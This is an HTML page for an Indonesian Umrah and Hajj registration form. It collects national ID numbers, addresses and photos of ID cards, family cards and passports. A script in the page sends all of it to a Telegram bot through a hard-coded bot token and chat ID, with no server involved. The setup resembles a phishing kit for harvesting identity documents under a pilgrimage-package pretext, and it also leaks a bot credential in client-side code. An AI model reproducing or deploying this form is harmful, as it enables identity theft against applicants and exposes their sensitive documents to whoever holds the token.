  <style>
    body {
      margin: 0;
      font-family: 'Poppins', sans-serif;
      background: url('hero-kaaba.jpg') no-repeat center center/cover;
      background-attachment: fixed;
      color: #fff;
    }

    .overlay {
      background: rgba(0, 0, 0, 0.6);
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      padding: 40px 20px;
    }

    .form-container {
      background: #fff;
      color: #000;
      padding: 30px;
      border-radius: 10px;
      max-width: 600px;
      width: 100%;
      box-shadow: 0 0 15px rgba(0,0,0,0.4);
    }

    .form-container h2 {
      text-align: center;
      margin-bottom: 20px;
    }

    label {
      display: block;
      margin: 10px 0 5px;
      font-weight: 600;
    }

    input, select, textarea {
      width: 100%;
      padding: 10px;
      border: 1px solid #ccc;
      border-radius: 5px;
      box-sizing: border-box;
    }

    button {
      margin-top: 20px;
      background: #007bff;
      color: #fff;
      padding: 12px;
      border: none;
      width: 100%;
      border-radius: 5px;
      font-weight: bold;
      cursor: pointer;
    }

    button:hover {
      background: #0056b3;
    }

    .loading {
      display: none;
      text-align: center;
      color: #007bff;
      font-weight: bold;
    }
  </style>

<body>
  <div class="overlay">
    <div class="form-container">
      <h2>Formulir Pendaftaran Umroh & Haji</h2>
      <form id="tgForm">
        <label>Nama Lengkap</label>
        <input type="text" name="nama" required />

        <label>Jenis Kelamin</label>
        <select name="jenis_kelamin" required>
          <option value="">-- Pilih --</option>
          <option>Laki-laki</option>
          <option>Perempuan</option>
        </select>

        <label>Tempat Lahir</label>
        <input type="text" name="tempat_lahir" required />

        <label>Tanggal Lahir</label>
        <input type="date" name="tanggal_lahir" required />

        <label>Nomor KTP</label>
        <input type="text" name="no_ktp" required />

        <label>Alamat Lengkap</label>
        <textarea name="alamat" rows="3" required></textarea>

        <label>Email</label>
        <input type="email" name="email" />

        <label>Nomor WhatsApp</label>
        <input type="tel" name="whatsapp" required />

        <label>Paket Dipilih</label>
        <select name="paket" required>
          <option value="">-- Pilih Paket --</option>
          <option>Umroh 9 Hari</option>
          <option>Umroh 12 Hari</option>
          <option>Umroh 14 Hari</option>
          <option>Haji Khusus Langsung Berangkat</option>
        </select>

        <label>Tanggal Keberangkatan</label>
        <input type="date" name="tanggal_berangkat" required />

        <label>Foto KTP</label>
        <input type="file" name="foto_ktp" accept="image/*" required />

        <label>Foto KK</label>
        <input type="file" name="foto_kk" accept="image/*" required />

        <label>Foto Paspor (jika sudah ada)</label>
        <input type="file" name="foto_paspor" accept="image/*" />

        <button type="submit">Kirim Pendaftaran</button>
        <div class="loading" id="loading">Mengirim data...</div>
      </form>
    </div>
  </div>

  <script>
    const form = document.getElementById('tgForm');
    const loading = document.getElementById('loading');

    form.addEventListener('submit', async function (e) {
      e.preventDefault();
      loading.style.display = 'block';

      const formData = new FormData(form);
      const token = '8470444840:AAH4VQDFuSNGoTlx2assgz-hM9Fi3mKRWew';
      const chatID = '987413154';

      let caption = `ðŸ“‹ Pendaftaran Baru\n\n`;
      for (let [key, value] of formData.entries()) {
        if (value instanceof File) continue;
        caption += `*${key.replace('_', ' ')}*: ${value}\n`;
      }

      // Kirim pesan teks
      await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: chatID,
          text: caption,
          parse_mode: 'Markdown'
        })
      });

      // Kirim foto satu per satu
      const files = ['foto_ktp', 'foto_kk', 'foto_paspor'];
      for (let key of files) {
        const file = formData.get(key);
        if (file && file.size > 0) {
          const data = new FormData();
          data.append('chat_id', chatID);
          data.append('photo', file);
          data.append('caption', `ðŸ“Ž ${key.replace('_', ' ').toUpperCase()}`);
          await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
            method: 'POST',
            body: data
          });
        }
      }

      alert('Pendaftaran berhasil dikirim! Admin akan segera menghubungi Anda.');
      form.reset();
      loading.style.display = 'none';
    });
  </script>
</body>
